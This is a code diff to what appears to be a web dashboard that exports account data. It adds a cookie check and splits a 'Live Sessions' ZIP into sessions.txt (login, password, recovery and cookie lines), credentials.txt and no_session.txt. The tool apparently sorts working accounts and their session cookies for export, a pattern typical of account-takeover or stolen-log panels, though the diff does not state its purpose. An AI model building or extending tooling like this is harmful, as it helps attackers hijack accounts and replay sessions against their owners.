@@ -247,7 +247,7 @@
       <div class="export-grid">
         <div class="export-card green" id="exportLiveSessions">
           <div class="export-card-title">Live Sessions ZIP</div>
-          <div class="export-card-desc">sessions.txt + credentials.txt</div>
+          <div class="export-card-desc">sessions.txt + credentials.txt + no_session.txt</div>
         </div>
         <div class="export-card green" id="exportLiveCredentials">
           <div class="export-card-title">Live Credentials</div>
@@ -827,10 +827,19 @@ function getCurrentEmails() {
 }
 
 // --- Export helpers ---
+function hasCookies(data) {
+  if (!data) return false;
+  const c = data.cookies;
+  if (!c) return false;
+  if (Array.isArray(c)) return c.length > 0;
+  if (typeof c === 'object') return Object.keys(c).length > 0;
+  return false;
+}
+
 function buildSessionLine(login) {
   const data = accountDataMap[login];
-  if (!data) return null;
-  const cookies = data.cookies || [];
+  if (!data || !hasCookies(data)) return null;
+  const cookies = data.cookies;
   const account = data.recovery
     ? `${data.login}:${data.password}:${data.recovery}`
     : `${data.login}:${data.password}`;
@@ -866,16 +875,21 @@ async function exportSessionsZip(category) {
 
   const zip = new JSZip();
 
-  const sessions = emails.map(e => buildSessionLine(e)).filter(Boolean);
-  const creds = emails.map(e => buildCredentialLine(e)).filter(Boolean);
+  const withCookies = emails.filter(e => hasCookies(accountDataMap[e]));
+  const withoutCookies = emails.filter(e => !hasCookies(accountDataMap[e]));
 
-  zip.file('sessions.txt', sessions.join('\n'));
-  zip.file('credentials.txt', creds.join('\n'));
+  const sessions = withCookies.map(e => buildSessionLine(e)).filter(Boolean);
+  const sessionCreds = withCookies.map(e => buildCredentialLine(e)).filter(Boolean);
+  const noSessionCreds = withoutCookies.map(e => buildCredentialLine(e)).filter(Boolean);
+
+  if (sessions.length) zip.file('sessions.txt', sessions.join('\n'));
+  if (sessionCreds.length) zip.file('credentials.txt', sessionCreds.join('\n'));
+  if (noSessionCreds.length) zip.file('no_session.txt', noSessionCreds.join('\n'));
 
   const blob = await zip.generateAsync({ type: 'blob' });
   const name = category === 'ALL' ? 'all' : category.toLowerCase();
   downloadBlob(`${name}_sessions.zip`, blob);
-  toast(`Exported ${emails.length} accounts`);
+  toast(`Exported ${sessions.length} sessions, ${noSessionCreds.length} without cookies`);
 }
 
 function exportCredentials(category) {
